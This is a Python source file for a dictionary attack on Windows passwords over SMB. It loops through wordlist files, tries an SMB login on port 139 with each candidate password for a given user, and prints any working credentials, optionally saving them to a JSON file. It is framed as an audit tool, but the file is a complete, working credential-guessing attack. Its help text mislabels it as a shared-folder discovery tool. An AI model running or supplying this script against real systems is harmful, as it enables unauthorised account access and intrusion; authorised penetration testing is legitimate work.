#!/usr/bin/env python
# coding=utf-8

"""
    File:           awdp_win_attack_dict.py
    Version:        1.0
    Date Version:   13/04/2017
    Author:         Gonzalo Déniz

    NAME
        awdp_win_attack_dict - Search password on remote computer with windows system

    SYNOPSIS:

        python awdp_win_attack_dict.py -r ip_remote -s hostname_remote -u user [ -j ]

    DESCRIPTION
        Search password on remote computer with windows system using dictionary files.

    OPTIONS
        -r ip_remote            Ip windows server
        -s hostname_remote      Remote computer name
        -u user                 Audited user

    FILES
        awdp_win_attack_dict.py          Executable file
        john.txt                         Password dictionary
        spanish.txt                      Password dictionary

    PREREQUISITE
       Install PySMB

    EXAMPLE
       python awdp_win_attack_dict.py -r 192.168.85.141 -s SRVDELTA1 -u Administrador

"""

from smb.SMBConnection import SMBConnection
import smb
import sys
import socket
import json
import os


MIN_NARG = 5    # Minimum number of arguments
DICT_PASS = ['spanish.txt', 'john.txt']

def man():
    man = '''
    NAME
        awdp_win_attack_dict - Discover shared network folders

    SYNOPSIS:

        python awdp_win_attack_dict.py -r ip_remote -s hostname_remote -u user [ -j ]

    DESCRIPTION
        For a computer with windows determine if it shares some network folder.

    OPTIONS
        -r ip_remote            Ip windows server.
        -s hostname_remote      Remote computer name
        -u user                 Audited user

    FILES
        awdp_win_attack_dict.py          Executable file
        john.txt                         Password dictionary
        spanish.txt                      Password dictionary

    PREREQUISITE
       Install PySMB

    EXAMPLE
       python awdp_win_attack_dict.py -r 192.168.85.141 -s SRVDELTA1 -u Administrador
        '''
    return man

def argument(argv):
    argv_d = {'ip_remote': None,
              'hostname': False,
              'user': '',
              'pwd': '',
              'json': False}

    # help
    if '-h' in argv:
        print(man())            # Return help
        sys.exit(0)

    # Minimum number of arguments
    if len(sys.argv) < MIN_NARG:
        print('Error syntax. To view help: awdp_win_attack_dict.py -h')
        sys.exit(1)

    # Mandatory arguments
    if '-r' in argv:
        pos = argv.index('-r')
        argv_d['ip_remote'] = argv[pos + 1]
    else:
        print('Error syntax. To view help: awdp_win_attack_dict.py -h')
        sys.exit(1)

    if '-s' in argv:
        pos = argv.index('-s')
        argv_d['hostname'] = argv[pos + 1]
    else:
        print('Error syntax. To view help: awdp_win_attack_dict.py -h')
        sys.exit(1)


    # Optional arguments
    if '-u' in argv:
        pos = argv.index('-u')
        argv_d['user'] = argv[pos + 1]
    if '-p' in argv:
        pos = argv.index('-p')
        argv_d['pwd'] = argv[pos + 1]
    if '-j' in argv:
        argv_d['json'] = True

    return argv_d


def login(arg_d, password):
    """
    Check user and password on remote computer

    :param arg_d:    Arguments
    :param password: Password
    :return:         None if fail login
                     (user,password) If there is success
    """
    try:
        # Connection
        s = SMBConnection(arg_d['user'],
                          password,
                          '',
                          arg_d['hostname'],
                          use_ntlm_v2=True)
        connected = s.connect(arg_d['ip_remote'], 139)
        if connected:

            # Successful login
            print('User: {0}'.format(arg_d['user']))
            print('Password: {0}'.format(password))

            # Return tuple (user, password)
            return (arg_d['user'], password)
        else:
            return None

    # Fail login
    except smb.base.NotReadyError:
        return None

def main():

    try:
        c = None
        pass_found = False
        arg_d = argument(sys.argv)

        # Search in all dictionary files
        for dfb in DICT_PASS:
            f = open(dfb, 'r')
            # check login word by word
            for password in f:
                c = login(arg_d, password.rstrip())
                # if password found then exit
                if c is not None:
                    pass_found = True
                    break
            # If the password is found the search is terminated.
            if pass_found:
                break


        if pass_found:
            result_json = {'win_attack_brute':{'user': c[0],
                                               'pass': c[1]}}


            # Writing json file
            if arg_d['json']:
                with open('awdp_win_attack_brute_results.json', 'w') as outfile:
                    json.dump(result_json, outfile)
                    print('Json file created in: ' + os.path.realpath(outfile.name))
        else:
            print('Password no found.')

     
    except socket.error as e:
        print('Error:' + e.strerror)
        sys.exit(1)
    except smb.base.NotConnectedError:
        print('Error: hostname {0} unknow'.format(arg_d['user']))
        sys.exit(1)
    except smb.base.NotReadyError:
        print('Authentication is required')
        sys.exit()

if __name__ == '__main__':
    main()
